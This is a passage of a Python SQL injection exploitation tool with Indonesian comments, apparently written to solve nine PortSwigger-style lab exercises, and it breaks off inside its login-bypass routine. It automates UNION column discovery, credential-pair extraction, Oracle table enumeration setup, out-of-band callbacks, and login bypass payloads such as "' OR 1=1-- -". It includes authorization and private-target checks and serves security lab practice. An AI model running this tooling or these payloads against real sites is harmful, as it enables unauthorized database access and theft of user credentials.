#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SATRIA SQL1 -- perbaikan terfokus untuk 9 lab SQL injection yang sebelumnya gagal.

Cakupan file ini HANYA 9 lab berikut:

  02  SQL injection vulnerability allowing login bypass
  06  SQL injection attack, listing the database contents on Oracle
  09  SQL injection UNION attack, retrieving data from other tables
  10  SQL injection UNION attack, retrieving multiple values in a single column
  11  Blind SQL injection with conditional responses
  12  Blind SQL injection with conditional errors
  13  Visible error-based SQL injection
  16  Blind SQL injection with out-of-band interaction
  17  Blind SQL injection with out-of-band data exfiltration

Perbaikan utama dibanding pemindai sebelumnya:

  * injeksi cookie dikirim sebagai header Cookie mentah pada sesi tanpa jar,
    sehingga nilai payload tidak ditimpa cookie jar requests (penyebab lab
    11/12/13/16/17 tidak pernah benar-benar terkirim);
  * payload UNION selalu menyertakan klausa FROM yang benar (FROM users /
    FROM dual) dan penempatan kolom diuji satu per satu;
  * lab 06 menjalankan rantai lengkap Oracle: hitung kolom, enumerasi
    all_tables, enumerasi all_tab_columns, lalu dump kredensial;
  * lab 11/12 memakai diferensial tiga kondisi (1=1 benar, 1=2 salah, 2=2
    benar) dan penanda teks unik, bukan hanya kemiripan halaman;
  * lab 13 hanya dikonfirmasi bila pesan error membawa nilai dari tabel users;
  * lab 16/17 memakai poller collaborator dan memisahkan interaksi dari
    eksfiltrasi data.

Pemakaian (hanya pada target milik Anda / lab yang diizinkan):

    python satria_SQL1.py https://lab-target --authorized
    python satria_SQL1.py https://lab-target --authorized \
        --oob-domain abc123.oastify.com \
        --oob-poll-url https://poll.example/api/interactions

Tanpa konfigurasi OOB, lab 16/17 dilaporkan "belum teruji" (bukan aman).
"""

from __future__ import annotations

import argparse
import html as html_module
import ipaddress
import json
import os
import random
import re
import socket
import statistics
import sys
import textwrap
import time
import unicodedata
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Iterable
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

import requests
from bs4 import BeautifulSoup

__version__ = "1.1.0"
USER_AGENT = f"SATRIA-SQL1/{__version__} (+authorized SQL injection lab scanner)"

OUTPUT_DIR = "satria_sql1_report"
OUTPUT_PDF = "satria_sql1_report/laporan_sql1.pdf"

# ---------------------------------------------------------------------------
# Katalog: hanya 9 lab yang diminta.
# ---------------------------------------------------------------------------
CATALOG9: list[tuple[int, str, str, str]] = [
    (2, "SQL injection vulnerability allowing login bypass", "login_bypass", "critical"),
    (6, "SQL injection attack, listing the database contents on Oracle", "oracle_listing", "high"),
    (9, "SQL injection UNION attack, retrieving data from other tables", "union_other_tables", "critical"),
    (10, "SQL injection UNION attack, retrieving multiple values in a single column", "union_multi_value", "critical"),
    (11, "Blind SQL injection with conditional responses", "blind_conditional", "high"),
    (12, "Blind SQL injection with conditional errors", "blind_errors", "high"),
    (13, "Visible error-based SQL injection", "visible_error", "high"),
    (16, "Blind SQL injection with out-of-band interaction", "oob_interaction", "medium"),
    (17, "Blind SQL injection with out-of-band data exfiltration", "oob_exfiltration", "critical"),
]

SQL_ERROR_PATTERNS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"ora-\d{4,5}"), "oracle"),
    (re.compile(r"oracle[^<]{0,40}error"), "oracle"),
    (re.compile(r"you have an error in your sql syntax|mysql syntax|mysqlexception|warning\s*:\s*mysql"), "mysql"),
    (re.compile(r"postgresql|pg_query\(|pg_exec\(|syntax error at or near|unterminated quoted string|invalid input syntax"), "postgresql"),
    (re.compile(r"microsoft sql server|odbc sql server|sqlserver|unclosed quotation mark|incorrect syntax near|conversion failed"), "mssql"),
    (re.compile(r"sqlite3?::|sqlite3\.operationalerror|sqlite/jdbc|sqlstate\[|no such column"), "sqlite"),
]

AUTH_MARKERS = (
    "log out", "logout", "sign out", "signout", "my account", "your account",
    "welcome back", "logged in as", "account dashboard", "dashboard",
)
AUTH_FAILURE_MARKERS = (
    "invalid username or password", "incorrect username", "incorrect password",
    "authentication failed", "login failed", "invalid credentials", "wrong password",
)

DESTRUCTIVE_PATH_RE = re.compile(
    r"(?:^|/)(?:logout|log-out|signout|sign-out|delete|remove|checkout|payment|purchase|"
    r"transfer|unsubscribe|empty-cart|clear-cart|add-to-cart|cart)(?:/|$)",
    re.I,
)

VOLATILE_REPLACEMENTS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b", re.I), " <UUID> "),
    (re.compile(r"\b[0-9a-f]{32,}\b", re.I), " <TOKEN> "),
    (re.compile(r"\b(?:csrf|authenticity)[^\"'<>:= ]*[:=][^\"'<> ]{8,}", re.I), " csrf=<TOKEN> "),
    (re.compile(r"\b20\d{2}-\d{2}-\d{2}[T ][0-9:.-]+(?:[+-]\d{2}:?\d{2}|Z)?\b"), " <TIMESTAMP> "),
    (re.compile(r"\b\d{10}\b"), " <TS> "),
]

# Kata yang tidak boleh dianggap nama tabel/kolom.
SQL_NOISE_WORDS = {
    "select", "from", "where", "union", "null", "order", "by", "and", "or",
    "table", "tables", "column", "columns", "database", "oracle", "mysql",
    "microsoft", "server", "error", "warning", "syntax", "html", "body",
    "div", "class", "span", "href", "http", "https", "product", "products",
    "price", "cart", "stock", "category", "search", "results", "home",
    "login", "username", "password", "users", "administrator", "welcome",
    "dual", "all_tables", "all_tab_columns", "information_schema",
}

WORD_RE = re.compile(r"[a-z0-9][a-z0-9@._%+-]*")


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------
@dataclass
class Response:
    status: int | None
    url: str
    text: str
    headers: dict[str, str]
    elapsed: float
    error: str | None = None

    @property
    def normalized(self) -> str:
        return normalize_text(self.text)

    @property
    def ok_status(self) -> bool:
        return self.status is not None and 200 <= self.status < 400

    @property
    def is_redirect(self) -> bool:
        return self.status in (301, 302, 303, 307, 308)


@dataclass
class FormSpec:
    page_url: str
    action: str
    method: str
    fields: tuple[tuple[str, str, str], ...]
    has_password: bool = False


@dataclass
class Page:
    url: str
    text: str
    status: int | None = None
    links: list[str] = field(default_factory=list)
    forms: list[FormSpec] = field(default_factory=list)


@dataclass
class Point:
    key: str
    kind: str  # query | form | cookie
    label: str
    url: str
    name: str
    original: str
    page_url: str = ""
    method: str = "GET"
    fields: tuple[tuple[str, str, str], ...] = ()
    interest: int = 0

    @property
    def numeric(self) -> bool:
        return bool(re.fullmatch(r"-?\d+(?:\.\d+)?", (self.original or "").strip()))


@dataclass
class Baseline:
    point: Point
    first: Response
    second: Response
    similarity: float

    @property
    def median_elapsed(self) -> float:
        return statistics.median([self.first.elapsed, self.second.elapsed])


@dataclass
class OOBSetup:
    kind: str
    domain: str
    token: str
    poll_url: str | None = None


# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------
def normalize_text(value: str) -> str:
    if not value:
        return ""
    soup = BeautifulSoup(value[:300_000], "html.parser")
    for tag in soup(["script", "style", "noscript"]):
        tag.decompose()
    text = soup.get_text(" ", strip=True) or value[:300_000]
    for pattern, replacement in VOLATILE_REPLACEMENTS:
        text = pattern.sub(replacement, text)
    return re.sub(r"\s+", " ", text).strip()


def similarity(a: str, b: str) -> float:
    if a == b:
        return 1.0
    if not a or not b:
        return 0.0
    import difflib

    return difflib.SequenceMatcher(None, a[:80_000], b[:80_000], autojunk=False).ratio()


def grams(normalized: str, size: int = 3) -> set[str]:
    """N-gram kata dari teks yang sudah dinormalisasi (penanda isi halaman)."""
    words = WORD_RE.findall((normalized or "").lower())
    out: set[str] = set()
    for index in range(len(words) - size + 1):
        chunk = " ".join(words[index:index + size])
        if len(chunk) >= 12:
            out.add(chunk)
    return out


def sql_errors(resp: Response | None) -> list[tuple[str, str]]:
    if resp is None or resp.error:
        return []
    body = (resp.text or "").lower()
    found: dict[str, str] = {}
    for pattern, dbms in SQL_ERROR_PATTERNS:
        for match in pattern.finditer(body):
            found.setdefault(dbms, re.sub(r"\s+", " ", match.group(0))[:160])
            if len(found) >= 4:
                return sorted(found.items())
    return sorted(found.items())


def has_sql_error(resp: Response | None) -> bool:
    return bool(sql_errors(resp))


def error_text(resp: Response | None) -> str:
    if resp is None:
        return ""
    return " | ".join(f"{dbms}: {message}" for dbms, message in sql_errors(resp))


def snippet(value: Any, limit: int = 240) -> str:
    text = re.sub(r"\s+", " ", str(value or "")).strip()
    return text[:limit]


def mask_secret(secret: str) -> str:
    if not secret:
        return ""
    if len(secret) <= 4:
        return "*" * len(secret)
    return f"{secret[:1]}***{secret[-1:]} (len={len(secret)})"


def random_token(prefix: str = "sat") -> str:
    return prefix + uuid.uuid4().hex[:10].lower()


def is_same_origin(url: str, base: str) -> bool:
    a, b = urlparse(url), urlparse(base)
    if a.scheme not in ("http", "https") or b.scheme not in ("http", "https"):
        return False
    return (
        a.scheme == b.scheme
        and (a.hostname or "").lower() == (b.hostname or "").lower()
        and (a.port or (443 if a.scheme == "https" else 80))
        == (b.port or (443 if b.scheme == "https" else 80))
    )


def canonical_url(url: str) -> str:
    parsed = urlparse(url)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path or "/", "", parsed.query, ""))


def url_with_param(url: str, name: str, value: str) -> str:
    parsed = urlparse(url)
    pairs = [(k, v) for k, v in parse_qsl(parsed.query, keep_blank_values=True) if k != name]
    pairs.append((name, value))
    query = urlencode(pairs, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path or "/", parsed.params, query, ""))


def ascii_clean(value: Any) -> str:
    text = str(value or "")
    replacements = {
        "\u2014": "-", "\u2013": "-", "\u2192": "->", "\u2022": "-", "\u00b7": "-",
        "\u00d7": "x", "\u2265": ">=", "\u2264": "<=", "\u2713": "[x]",
        "\u2018": "'", "\u2019": "'", "\u201c": '"', "\u201d": '"', "\u00a0": " ",
    }
    for old, new in replacements.items():
        text = text.replace(old, new)
    text = unicodedata.normalize("NFKD", text).encode("ascii", "ignore").decode("ascii")
    return re.sub(r"\s+", " ", text).strip()


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------
class Sql1Scanner:
    def __init__(
        self,
        target_url: str,
        *,
        authorized: bool = False,
        allow_private: bool = False,
        max_pages: int = 25,
        max_points: int = 16,
        max_requests: int = 900,
        timeout: float = 10.0,
        oob_domain: str | None = None,
        oob_poll_url: str | None = None,
        oob_webhook_site: bool = False,
        oob_wait: float = 20.0,
    ) -> None:
        self.target_url = self._normalize_target(target_url)
        if not authorized:
            raise ValueError("Pengujian aktif memerlukan --authorized (izin pengujian).")
        if not allow_private:
            self._validate_public_target(self.target_url)
        self.max_pages = max(2, min(max_pages, 40))
        self.max_points = max(2, min(max_points, 40))
        self.max_requests = max(80, min(max_requests, 1800))
        self.timeout = max(3.0, min(timeout, 30.0))
        self.oob_wait = max(0.0, min(oob_wait, 90.0))
        self.request_count = 0
        self.started = time.monotonic()
        self.stats: dict[str, Any] = {
            "pages_fetched": 0,
            "requests": 0,
            "errors": [],
            "notes": [],
        }
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": USER_AGENT,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache",
            }
        )
        # Sesi tanpa cookie: dipakai agar header Cookie mentah tidak ditimpa
        # oleh cookie jar (akar masalah lab blind/error/OOB sebelumnya).
        self._raw_session = requests.Session()
        self._raw_session.headers.update(dict(self.session.headers))
        self.pages: list[Page] = []
        self.points: list[Point] = []
        self._baselines: dict[str, Baseline | None] = {}
        self._column_counts: dict[str, int | None] = {}
        self._findings: dict[int, dict[str, Any]] = {}
        self.oob = self._setup_oob(oob_domain, oob_poll_url, oob_webhook_site)
        self.oob_status = "configured" if self.oob else "not_configured"

    # ---------------------------------------------------------------- target
    @staticmethod
    def _normalize_target(url: str) -> str:
        value = (url or "").strip()
        if not value:
            raise ValueError("Target URL wajib diisi.")
        if not re.match(r"^https?://", value, re.I):
            value = "https://" + value
        parsed = urlparse(value)
        if parsed.scheme not in ("http", "https") or not parsed.hostname:
            raise ValueError("Target harus berupa URL http:// atau https:// yang valid.")
        if parsed.username or parsed.password:
            raise ValueError("Jangan sertakan kredensial pada URL target.")
        return urlunparse((parsed.scheme.lower(), parsed.netloc, parsed.path or "/", parsed.params, parsed.query, ""))

    def _validate_public_target(self, url: str) -> None:
        host = (urlparse(url).hostname or "").rstrip(".").lower()
        if host in {"localhost", "localhost.localdomain"} or host.endswith(
            (".localhost", ".local", ".internal", ".test", ".invalid")
        ):
            raise ValueError("Target localhost/internal ditolak tanpa --allow-private.")
        parsed = urlparse(url)
        try:
            records = socket.getaddrinfo(
                host, parsed.port or (443 if parsed.scheme == "https" else 80),
                type=socket.SOCK_STREAM,
            )
        except socket.gaierror as exc:
            raise ValueError(f"Hostname target tidak dapat di-resolve: {exc}") from exc
        for item in records:
            address = item[4][0].split("%", 1)[0]
            if not ipaddress.ip_address(address).is_global:
                raise ValueError(f"Target mengarah ke IP non-publik ({address}); pemindaian dihentikan.")

    def _same_origin(self, url: str) -> bool:
        return is_same_origin(url, self.target_url)

    def _within_budget(self) -> bool:
        return self.request_count < self.max_requests

    # ------------------------------------------------------------------- OOB
    def _setup_oob(self, domain: str | None, poll_url: str | None, webhook_site: bool) -> OOBSetup | None:
        domain = (domain or os.getenv("SATRIA_OOB_DOMAIN") or "").strip().lower().strip(".")
        poll_url = (poll_url or os.getenv("SATRIA_OOB_POLL_URL") or "").strip() or None
        if webhook_site:
            token = self._create_webhook_site_token()
            if token:
                return OOBSetup("webhook_site", "webhook.site", token, f"https://webhook.site/token/{token}/requests")
            self.stats["notes"].append("Pembuatan token webhook.site gagal; OOB tidak aktif.")
            return None
        if domain:
            return OOBSetup("domain", domain, random_token("sat"), poll_url)
        return None

    @staticmethod
    def _create_webhook_site_token() -> str | None:
        try:
            resp = requests.post("https://webhook.site/token", timeout=15)
            resp.raise_for_status()
            token = resp.json().get("uuid")
            return token if isinstance(token, str) and token else None
        except Exception:
            return None

    # ------------------------------------------------------------------ HTTP
    def _request(
        self,
        method: str,
        url: str,
        *,
        session: requests.Session | None = None,
        params: Any = None,
        data: Any = None,
        headers: dict[str, str] | None = None,
        allow_redirects: bool = False,
        timeout: float | None = None,
    ) -> Response:
        if not self._within_budget():
            return Response(None, url, "", {}, 0.0, error="budget_exhausted")
        started = time.monotonic()
        try:
            raw = (session or self.session).request(
                method,
                url,
                params=params,
                data=data,
                headers=headers,
                timeout=timeout or self.timeout,
                allow_redirects=allow_redirects,
            )
            self.request_count += 1
            self.stats["requests"] = self.request_count
            return Response(
                status=raw.status_code,
                url=raw.url,
                text=raw.text or "",
                headers={key.lower(): value for key, value in dict(raw.headers).items()},
                elapsed=time.monotonic() - started,
            )
        except requests.RequestException as exc:
            self.request_count += 1
            self.stats["requests"] = self.request_count
            return Response(None, url, "", {}, time.monotonic() - started,
                            error=f"{type(exc).__name__}: {str(exc)[:160]}")
        except Exception as exc:  # pragma: no cover - pertahanan terakhir
            self.request_count += 1
            self.stats["requests"] = self.request_count
            return Response(None, url, "", {}, time.monotonic() - started,
                            error=f"{type(exc).__name__}: {str(exc)[:160]}")

    def _cookie_header(self, name: str | None = None, value: str | None = None) -> str:
        jar: dict[str, str] = {}
        for cookie in self.session.cookies:
            jar[cookie.name] = cookie.value or ""
        if name is not None:
            jar[name] = (value or "").replace("\r", "").replace("\n", "")
        return "; ".join(f"{key}={val}" for key, val in jar.items())

    # --------------------------------------------------------------- sending
    def _form_payload(self, point: Point, value: str) -> dict[str, str]:
        data: dict[str, str] = {}
        for name, field_value, typ in point.fields:
            if typ in {"submit", "button", "file"}:
                continue
            data[name] = value if name == point.name else field_value
        data.setdefault(point.name, value)
        return data

    def send(self, point: Point, value: str | None = None) -> Response:
        target = point.original if value is None else value
        if point.kind == "query":
            return self._request("GET", url_with_param(point.url, point.name, target))
        if point.kind == "form":
            data = self._form_payload(point, target)
            if point.method.upper() == "POST":
                return self._request("POST", point.url, data=data)
            return self._request("GET", point.url, params=data)
        if point.kind == "cookie":
            header = self._cookie_header(point.name, target)
            self._raw_session.cookies.clear()
            return self._request("GET", point.url, session=self._raw_session, headers={"Cookie": header})
        return Response(None, point.url, "", {}, 0.0, error=f"unknown_point_kind:{point.kind}")

    @staticmethod
    def _quote(point: Point) -> str:
        return "" if point.numeric else "'"

    def union_value(self, point: Point, core: str) -> str:
        """Nilai lengkap untuk injeksi UNION/ORDER BY."""
        base = point.original or ""
        return f"{base}{self._quote(point)} {core}-- -"

    def expr_value(self, point: Point, suffix: str, comment: bool = True) -> str:
        base = point.original or ""
        tail = "-- -" if comment else ""
        return f"{base}{self._quote(point)}{suffix}{tail}"

    # ----------------------------------------------------------------- crawl
    def _parse_forms(self, base_url: str, soup: BeautifulSoup) -> list[FormSpec]:
        forms: list[FormSpec] = []
        for form in soup.find_all("form"):
            action = urljoin(base_url, (form.get("action") or "").strip() or base_url)
            if not self._same_origin(action):
                continue
            method = (form.get("method") or "GET").lower()
            fields: list[tuple[str, str, str]] = []
            has_password = False
            for element in form.find_all(["input", "textarea", "select"]):
                name = element.get("name")
                if not name:
                    continue
                typ = (element.get("type") or ("textarea" if element.name == "textarea" else "text")).lower()
                if typ == "password":
                    has_password = True
                value = element.get("value") or ""
                fields.append((str(name), value, typ))
            forms.append(FormSpec(base_url, action, method, tuple(fields), has_password))
        return forms

    def crawl(self) -> None:
        queue: list[str] = [self.target_url]
        for extra in ("/login", "/my-account", "/filter?category=Gifts"):
            candidate = urljoin(self.target_url, extra)
            if self._same_origin(candidate):
                queue.append(candidate)
        seen: set[str] = set()
        while queue and len(self.pages) < self.max_pages and self._within_budget():
            url = queue.pop(0).split("#", 1)[0]
            if url in seen:
                continue
            seen.add(url)
            resp = self._request("GET", url, allow_redirects=True)
            if resp.error or resp.status is None or resp.status >= 400:
                continue
            final = canonical_url(resp.url)
            self.stats["pages_fetched"] += 1
            soup = BeautifulSoup(resp.text[:400_000], "html.parser")
            page = Page(url=final, text=resp.text, status=resp.status)
            for anchor in soup.find_all("a", href=True):
                link = urljoin(resp.url, anchor["href"].strip()).split("#", 1)[0]
                if not self._same_origin(link):
                    continue
                if DESTRUCTIVE_PATH_RE.search(urlparse(link).path or ""):
                    continue
                if link not in page.links and len(page.links) < 100:
                    page.links.append(link)
            page.forms = self._parse_forms(resp.url, soup)
            self.pages.append(page)
            for link in page.links:
                if link not in seen and len(seen) + len(queue) < self.max_pages * 4:
                    queue.append(link)

    # ---------------------------------------------------------------- points
    @staticmethod
    def _interest(name: str, kind: str) -> int:
        lowered = name.lower()
        score = 1
        for token, bonus in (
            ("tracking", 8), ("track", 7), ("category", 7), ("product", 6),
            ("store", 5), ("stock", 5), ("search", 4), ("user", 3), ("id", 3),
        ):
            if token in lowered:
                score += bonus
        if kind == "cookie":
            score += 3
        if re.search(r"(session|csrf|token|auth)", lowered):
            score -= 6
        return score

    def build_points(self) -> None:
        points: list[Point] = []
        seen: set[str] = set()

        def add(point: Point) -> None:
            if point.key and point.key not in seen:
                seen.add(point.key)
                points.append(point)

        for page in self.pages:
            parsed = urlparse(page.url)
            for name, value in parse_qsl(parsed.query, keep_blank_values=True):
                if re.search(r"(csrf|nonce|session|sid|timestamp|_ts)", name, re.I) and len(value or "") >= 8:
                    continue
                url = urlunparse((parsed.scheme, parsed.netloc, parsed.path or "/", "", parsed.query, ""))
                add(Point(
                    key=f"query|{parsed.path}|{name}", kind="query", label=f"query `{name}`",
                    url=url, name=name, original=value or "1", page_url=page.url,
                    interest=self._interest(name, "query"),
                ))
            for form in page.forms:
                if form.method != "get" or form.has_password:
                    continue
                path = urlparse(form.action).path or "/"
                if DESTRUCTIVE_PATH_RE.search(path):
                    continue
                for name, value, typ in form.fields:
                    if typ in {"hidden", "password", "checkbox", "radio", "file", "submit", "button"}:
                        continue
                    add(Point(
                        key=f"form|{path}|{name}", kind="form", label=f"form `{name}`",
                        url=form.action, name=name, original=value or "1", page_url=page.url,
                        method="GET", fields=form.fields, interest=self._interest(name, "form"),
                    ))
        cookie_seen: set[str] = set()
        for cookie in self.session.cookies:
            if not cookie.name or cookie.name in cookie_seen:
                continue
            cookie_seen.add(cookie.name)
            add(Point(
                key=f"cookie|{cookie.name}", kind="cookie", label=f"cookie `{cookie.name}`",
                url=self.target_url, name=cookie.name, original=cookie.value or "1",
                page_url=self.target_url, interest=self._interest(cookie.name, "cookie"),
            ))
        self.points = sorted(points, key=lambda item: (-item.interest, item.kind, item.label))[: self.max_points]

    # -------------------------------------------------------------- baseline
    def baseline(self, point: Point) -> Baseline | None:
        if point.key in self._baselines:
            return self._baselines[point.key]
        first = self.send(point)
        second = self.send(point)
        if first.error or second.error or first.status is None or second.status is None:
            self._baselines[point.key] = None
            return None
        if first.status >= 500 or second.status >= 500 or first.status in (404, 405):
            self._baselines[point.key] = None
            return None
        score = similarity(first.normalized, second.normalized)
        if score < 0.85:
            self._baselines[point.key] = None
            return None
        result = Baseline(point, first, second, score)
        self._baselines[point.key] = result
        return result

    # -------------------------------------------------------------- findings
    def _mark(
        self,
        number: int,
        location: str,
        evidence: str,
        method: str,
        *,
        severity: str | None = None,
        confidence: str = "high",
        details: dict[str, Any] | None = None,
    ) -> None:
        if number in self._findings:
            return
        meta = next(item for item in CATALOG9 if item[0] == number)
        entry: dict[str, Any] = {
            "id": f"sql_injection-{number:02d}",
            "status": "confirmed",
            "title": meta[1],
            "method": method,
            "location": location,
            "evidence": snippet(evidence, 460),
            "severity": severity or meta[3],
            "confidence": confidence,
        }
        if details:
            entry["details"] = details
        self._findings[number] = entry

    # ------------------------------------------------------------- UNION core
    def column_count(self, point: Point) -> int | None:
        if point.key in self._column_counts:
            return self._column_counts[point.key]
        base = self.baseline(point)
        if not base:
            self._column_counts[point.key] = None
            return None

        by_order: int | None = None
        accepted = 0
        for count in range(1, 11):
            resp = self.send(point, self.union_value(point, f"ORDER BY {count}"))
            if resp.error:
                break
            broken = has_sql_error(resp) or (resp.status or 0) >= 500
            if broken:
                by_order = accepted or None
                break
            accepted = count

        by_union: int | None = None
        last_ok = 0
        for count in range(1, 9):
            ok = False
            for suffix in ("", " FROM dual"):
                core = "UNION SELECT " + ",".join(["NULL"] * count) + suffix
                resp = self.send(point, self.union_value(point, core))
                if resp.error:
                    continue
                if not has_sql_error(resp) and (resp.status or 0) < 500:
                    ok = True
                    break
            if ok:
                last_ok = count
            else:
                if last_ok:
                    by_union = last_ok
                break

        if by_order and by_union and by_order == by_union:
            result: int | None = by_order
        elif by_order and not by_union:
            result = by_order
        elif by_union and not by_order:
            result = by_union
        else:
            result = by_order if by_order else by_union
        if result:
            self.stats["notes"].append(f"column_count={result} pada {point.label} (ORDER BY={by_order}, UNION NULL={by_union})")
        self._column_counts[point.key] = result
        return result

    def text_columns(self, point: Point, cols: int) -> list[int]:
        visible: list[int] = []
        token = random_token("satc")
        for index in range(cols):
            marker = f"{token}{index}"
            exprs = ["NULL"] * cols
            exprs[index] = f"'{marker}'"
            for suffix in ("", " FROM dual"):
                core = "UNION SELECT " + ",".join(exprs) + suffix
                resp = self.send(point, self.union_value(point, core))
                if resp.error:
                    continue
                if marker in (resp.text or ""):
                    visible.append(index)
                    break
        return visible

    def _union_with(self, point: Point, cols: int, values: dict[int, str], from_clause: str) -> Response:
        exprs = ["NULL"] * cols
        for index, expr in values.items():
            if 0 <= index < cols:
                exprs[index] = expr
        core = "UNION SELECT " + ",".join(exprs)
        if from_clause:
            core += " " + from_clause
        return self.send(point, self.union_value(point, core))

    # ------------------------------------------------------------- extraction
    @staticmethod
    def _looks_like_secret(value: str) -> bool:
        if not (6 <= len(value) <= 80):
            return False
        if value.lower() in SQL_NOISE_WORDS:
            return False
        if not re.fullmatch(r"[A-Za-z0-9$./=_+!@#%^-]+", value):
            return False
        return bool(re.search(r"\d", value)) or len(value) >= 10

    def _extract_pairs(self, resp: Response, base_text: str) -> list[tuple[str, str]]:
        if resp is None or resp.error or not resp.text:
            return []
        text = normalize_text(resp.text)
        base_low = (base_text or "").lower()
        pairs: list[tuple[str, str]] = []
        patterns = (
            re.compile(r"(?<![A-Za-z0-9._@-])([A-Za-z0-9][A-Za-z0-9._@-]{1,38})[~|]([A-Za-z0-9$./=_+!@#%^-]{6,80})(?![A-Za-z0-9])"),
            re.compile(r"(?<![A-Za-z0-9._@-])([A-Za-z0-9][A-Za-z0-9._@-]{1,38})\s+([A-Za-z0-9$./=_+!@#%^-]{6,80})(?![A-Za-z0-9])"),
        )
        for pattern in patterns:
            for match in pattern.finditer(text):
                user, secret = match.group(1), match.group(2)
                if user.lower() in SQL_NOISE_WORDS or secret.lower() in SQL_NOISE_WORDS:
                    continue
                if user.lower() in base_low or secret in base_text:
                    continue
                if not self._looks_like_secret(secret):
                    continue
                if user.lower() != "administrator" and not re.search(r"\d", secret):
                    continue
                pair = (user, secret)
                if pair not in pairs:
                    pairs.append(pair)
        pairs.sort(key=lambda item: (item[0].lower() != "administrator", len(item[0])))
        return pairs

    @staticmethod
    def _new_identifiers(text: str, base_text: str) -> list[str]:
        baseline_words = set(re.findall(r"[A-Za-z_][A-Za-z0-9_$]{2,40}", base_text or ""))
        out: list[str] = []
        for match in re.finditer(r"(?<![A-Za-z0-9_$])([A-Z][A-Z0-9_$]{3,40})(?![A-Za-z0-9_$])", text or ""):
            token = match.group(1)
            if token in baseline_words or token.lower() in SQL_NOISE_WORDS:
                continue
            if not re.search(r"[A-Z]", token):
                continue
            if token not in out:
                out.append(token)
        return out

    # ----------------------------------------------------------- 02: login
    def _login_form_candidates(self) -> list[FormSpec]:
        seen: set[tuple[str, str]] = set()
        forms: list[FormSpec] = []
        for page in self.pages:
            for form in page.forms:
                has_password = form.has_password or any(
                    re.search(r"(^|_)pass(word)?($|_)", name, re.I) and typ not in {"hidden"}
                    for name, _value, typ in form.fields
                )
                if not has_password:
                    continue
                key = (form.action, form.method)
                if key in seen:
                    continue
                seen.add(key)
                forms.append(form)
        return forms

    def _login_attempt(self, form: FormSpec, overrides: dict[str, str]) -> tuple[int | None, str, str] | None:
        session = requests.Session()
        session.headers.update(dict(self.session.headers))
        landing = self._request("GET", form.page_url, session=session, allow_redirects=True)
        if landing.error:
            return None
        hidden: dict[str, str] = {}
        try:
            soup = BeautifulSoup(landing.text[:200_000], "html.parser")
            for fresh in self._parse_forms(landing.url, soup):
                if urlparse(fresh.action).path != urlparse(form.action).path or not fresh.has_password:
                    continue
                hidden = {name: value for name, value, typ in fresh.fields if typ == "hidden"}
                break
            else:
                hidden = {
                    str(el.get("name")): el.get("value") or ""
                    for el in soup.find_all("input", {"type": "hidden"})
                    if el.get("name")
                }
        except Exception:
            hidden = {}
        data: dict[str, str] = {}
        for name, value, typ in form.fields:
            if typ in {"submit", "button", "file"}:
                continue
            data[name] = value
        data.update(hidden)
        data.update(overrides)
        if form.method.upper() == "POST":
            resp = self._request("POST", form.action, session=session, data=data, allow_redirects=False)
        else:
            resp = self._request("GET", form.action, session=session, params=data, allow_redirects=False)
        if resp.error:
            return None
        location = resp.headers.get("location", "")
        if resp.is_redirect and location:
            nxt = urljoin(form.action, location)
            if self._same_origin(nxt):
                followed = self._request("GET", nxt, session=session, allow_redirects=True)
                if not followed.error:
                    return followed.status, followed.text, location
        return resp.status, resp.text, location

    def _login_succeeded(self, base_text: str, status: int | None, body: str, location: str) -> tuple[bool, str]:
        low = (body or "").lower()
        base_low = (base_text or "").lower()
        if any(marker in low for marker in AUTH_FAILURE_MARKERS):
            return False, ""
        base_failures = [marker for marker in AUTH_FAILURE_MARKERS if marker in base_low]
        new_markers = [marker for marker in AUTH_MARKERS if marker in low and marker not in base_low]
        if location and re.search(r"(my-account|account|dashboard|profile)", location, re.I) \
                and not re.search(r"(login|error|fail)", location, re.I):
            return True, f"redirect ke {location!r}"
        if new_markers:
            return True, f"penanda terautentikasi baru: {', '.join(new_markers[:3])}"
        if base_failures and status is not None and 200 <= status < 400 and len(body or "") > 200:
            return True, f"pesan gagal {base_failures[0]!r} hilang dan halaman berubah"
        return False, ""

    def detect_login_bypass(self) -> None:
        forms = self._login_form_candidates()
        if not forms:
            self.stats["notes"].append("Login bypass: tidak ada form ber-password yang ditemukan.")
            return
        payloads = (
            ("username", "administrator'-- -"),
            ("username", "administrator'--"),
            ("username", "administrator'#"),
            ("username", "administrator' OR 1=1-- -"),
            ("username", "' OR 1=1-- -"),
            ("username", "' OR '1'='1'-- -"),
            ("password", "' OR 1=1-- -"),
            ("password", "x' OR '1'='1'-- -"),
        )
        for form in forms:
            if 2 in self._findings:
                return
            user_field = next(
                (name for name, _v, typ in form.fields
                 if typ not in {"hidden", "password"} and re.search(r"(user|email|login|name)", name, re.I)),
                None,
            )
            pass_field = next(
                (name for name, _v, typ in form.fields if re.search(r"pass", name, re.I) or typ == "password"),
                None,
            )
            if not user_field or not pass_field:
                continue
            bogus = random_token("nouser")
            base_attempt = self._login_attempt(form, {user_field: bogus, pass_field: bogus})
            if base_attempt is None:
                continue
            base_status, base_body, base_location = base_attempt
            base_low = (base_body or "").lower()
            base_is_failure = (
                any(marker in base_low for marker in AUTH_FAILURE_MARKERS)
                or bool(re.search(r"(login|signin|sign-in)", base_location or "", re.I))
                or "password" in base_low
            )
            if not base_is_failure:
                continue
            for field, payload in payloads:
                if field == "username":
                    overrides = {user_field: payload, pass_field: bogus}
                else:
                    overrides = {user_field: bogus, pass_field: payload}
                first = self._login_attempt(form, overrides)
                if first is None:
                    continue
                ok, reason = self._login_succeeded(base_body, *first)
                if not ok:
                    continue
                second = self._login_attempt(form, overrides)
                if second is None:
                    continue
                ok2, reason2 = self._login_succeeded(base_body, *second)
                if not ok2:
                    continue
